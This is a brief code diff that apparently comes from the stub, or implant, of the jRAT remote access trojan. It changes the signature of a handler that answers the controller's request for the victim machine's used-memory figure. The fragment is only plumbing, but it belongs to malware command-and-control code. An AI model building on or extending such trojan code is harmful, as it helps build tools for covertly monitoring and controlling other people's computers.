@@ -6,7 +6,7 @@ import se.jrat.stub.packets.outgoing.Packet24UsedMemory;
 public class Packet33UsedMemory extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		Connection.instance.addToSendQueue(new Packet24UsedMemory());
 	}
 
